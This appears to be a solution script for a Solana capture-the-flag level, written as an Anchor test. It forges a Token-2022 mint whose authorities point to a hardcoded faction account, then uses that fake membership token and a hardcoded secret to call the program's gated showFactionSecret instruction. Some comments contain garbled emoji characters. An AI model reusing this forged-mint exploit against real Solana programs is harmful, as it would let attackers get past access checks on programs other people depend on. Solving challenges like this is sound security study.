import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Level3 } from "../target/types/level_3";
import * as web3 from '@solana/web3.js';
import {
  TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID,
  setAuthority,
  getAssociatedTokenAddressSync,
  createMint,
  mintTo,
  getOrCreateAssociatedTokenAccount,
  AuthorityType,
  createInitializeMetadataPointerInstruction,
  getMintLen,
  ExtensionType,
  getMint,
  createInitializeMintInstruction
} from "@solana/spl-token";

export const mint = new web3.PublicKey("AsqdvXVEZaSFRNJ5ERSSUL5firH2KBhjP76tsYXB1eKK");
export const factionCreator = new web3.PublicKey("4A4cPZgQx2cZ3aejRLCMSX5839gVM3Gjrii2nxfGVwVj");
export const faction1 = new web3.PublicKey("GG9rdMcjKFssQEdyLAeFrPSeZCPcGUBowTpwtGerrggp");

const SECRET = "eecc857933d8929d484d89618dde031e09183e4cc4dbe954a9055070b332983a"

describe("level-3", () => {
  const provider = anchor.AnchorProvider.env();

  anchor.setProvider(provider);

  const program = anchor.workspace.Level3 as Program<Level3>;
  const { Keypair, PublicKey } = web3;

  // Constants
  const systemProgram = web3.SystemProgram.programId;
  const tokenProgram = TOKEN_2022_PROGRAM_ID;
  const associatedTokenProgram = ASSOCIATED_TOKEN_PROGRAM_ID
  const TokenName = "Zeref"
  const TokenSymbol = "ZRF"


  const fakeMember = Keypair.generate();

  const newMember = Keypair.generate()
  const factionCreator = Keypair.generate();
  const mint = Keypair.generate();
  const fakeMint = Keypair.generate();

  const faction = PublicKey.findProgramAddressSync(
    [
      Buffer.from("faction"),
      factionCreator.publicKey.toBuffer(),
      mint.publicKey.toBuffer()
    ],
    program.programId
  )[0]
  let newMemberATA;


  before("Fund the users!", async () => {
    await airdrop(provider.connection, newMember.publicKey)
    await airdrop(provider.connection, factionCreator.publicKey)
    await airdrop(provider.connection, mint.publicKey)
    await airdrop(provider.connection, fakeMember.publicKey)
    newMemberATA = getAssociatedTokenAddressSync(mint.publicKey, newMember.publicKey, false, tokenProgram)
  });

  it("Run all the ixs", async () => {

    const newFakeATA = await createATAandMint(fakeMember, faction, fakeMint)
    console.log("Running the instruction")
    await program.methods.initialize(TokenName, TokenSymbol)
      .accountsStrict({
        faction,
        factionCreator: factionCreator.publicKey,
        mint: mint.publicKey,
        systemProgram,
        tokenProgram
      })
      .signers([factionCreator, mint])
      .rpc({
        commitment: "confirmed"
      })

    await program.methods.obtainFactionToken()
      .accountsStrict({
        associatedTokenProgram,
        tokenProgram,
        faction,
        mint: mint.publicKey,
        factionAuthority: factionCreator.publicKey,
        newMember: newMember.publicKey,
        newMemberTokenAccount: newMemberATA,
        systemProgram
      })
      .signers([newMember, factionCreator])
      .rpc()

    const txSig = await program.methods.showFactionSecret(SECRET)
      .accountsStrict({
        faction: faction1,
        factionMember: fakeMember.publicKey,
        memberTokenAccount: newFakeATA,
        mint: fakeMint.publicKey
      })
      .signers([fakeMember])
      .rpc()

    await provider.connection.confirmTransaction(txSig, "confirmed")


    await logTxn(txSig)
  })

  async function logTxn(txSignature: any, connection: anchor.web3.Connection = provider.connection,) {
    // Confirm the transaction to ensure it's finalized
    const latestBlockhash = await connection.getLatestBlockhash();
    await connection.confirmTransaction(
      {
        signature: txSignature,
        blockhash: latestBlockhash.blockhash,
        lastValidBlockHeight: latestBlockhash.lastValidBlockHeight,
      },
      "confirmed"
    );

    // Retrieve the transaction details
    const txDetails = await connection.getTransaction(txSignature, {
      commitment: "confirmed",
      maxSupportedTransactionVersion: 0,
    });

    const logs = txDetails?.meta?.logMessages;

    if (logs) {
      console.log("Transaction Logs:");
      logs.forEach((log) => console.log(log));
    } else {
      console.log("No logs found for this transaction.");
    }
  }

  async function createATAandMint(payer: web3.Keypair, faction: web3.PublicKey, fakeMint: web3.Keypair): Promise<web3.PublicKey> {
    try {
      const mintLen = getMintLen([ExtensionType.MetadataPointer]);

      const lamports = await provider.connection.getMinimumBalanceForRentExemption(mintLen);

      // Create the mint account with enough space for the metadata pointer extension
      const createMintIx = web3.SystemProgram.createAccount({
        fromPubkey: payer.publicKey,
        newAccountPubkey: fakeMint.publicKey, // ðŸ‘ˆ use fakeMint consistently
        space: mintLen,
        lamports,
        programId: TOKEN_2022_PROGRAM_ID,
      });

      // Create a placeholder metadata account
      const metadataAccount = Keypair.generate();

      // Initialize the MetadataPointer extension
      const initializeMetadataPointerIx = createInitializeMetadataPointerInstruction(
        fakeMint.publicKey,
        fakeMember.publicKey,        // ðŸ‘ˆ authority that can update metadata pointer
        fakeMint.publicKey,   // ðŸ‘ˆ the account that will be the metadata pointer
        TOKEN_2022_PROGRAM_ID
      );

      // Initialize the mint with fakeMember as both mint and freeze authority
      const initializeMintIx = createInitializeMintInstruction(
        fakeMint.publicKey,
        0,                        // Decimals
        fakeMember.publicKey,     // Mint authority
        fakeMember.publicKey,     // Freeze authority
        TOKEN_2022_PROGRAM_ID
      );

      // Send the transaction
      const tx = new web3.Transaction().add(
        createMintIx,
        initializeMetadataPointerIx,
        initializeMintIx
      );

      await web3.sendAndConfirmTransaction(
        provider.connection,
        tx,
        [payer, fakeMint], // ðŸ‘ˆ mint must sign account creation
        { commitment: "confirmed" }
      );

      const newFakeATA = await getOrCreateAssociatedTokenAccount(
        provider.connection,
        payer,
        fakeMint.publicKey,
        fakeMember.publicKey,
        false,
        "confirmed",
        {
          commitment: "confirmed"
        },
        tokenProgram,
        associatedTokenProgram
      )

      await mintTo(
        provider.connection,
        payer,
        fakeMint.publicKey,
        newFakeATA.address,
        fakeMember,
        1,
        [],
        { commitment: "confirmed" },
        tokenProgram
      )

      await setAuthority(
        provider.connection,
        payer,
        fakeMint.publicKey,
        fakeMember,
        AuthorityType.MintTokens,
        faction1,
        [fakeMember],
        {
          commitment: "confirmed"
        },
        tokenProgram
      )
      await setAuthority(
        provider.connection,
        payer,
        fakeMint.publicKey,
        fakeMember,
        AuthorityType.FreezeAccount,
        faction1,
        [fakeMember],
        {
          commitment: "confirmed"
        },
        tokenProgram
      )

      const fakeMintInfo = await getMint(provider.connection, fakeMint.publicKey, "confirmed", TOKEN_2022_PROGRAM_ID)

      console.log(`FakeMember:::${fakeMember.publicKey.toString()}\nFaction::::${faction.toString()}\nMintAuthority and pubkey::::${fakeMintInfo.address.toString()}\n${fakeMintInfo.mintAuthority.toString()}`)

      return newFakeATA.address

    } catch (err) {
      throw Error(err)
    }

  }

});


async function airdrop(connection: any, address: any, amount = 10_000_000_000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}
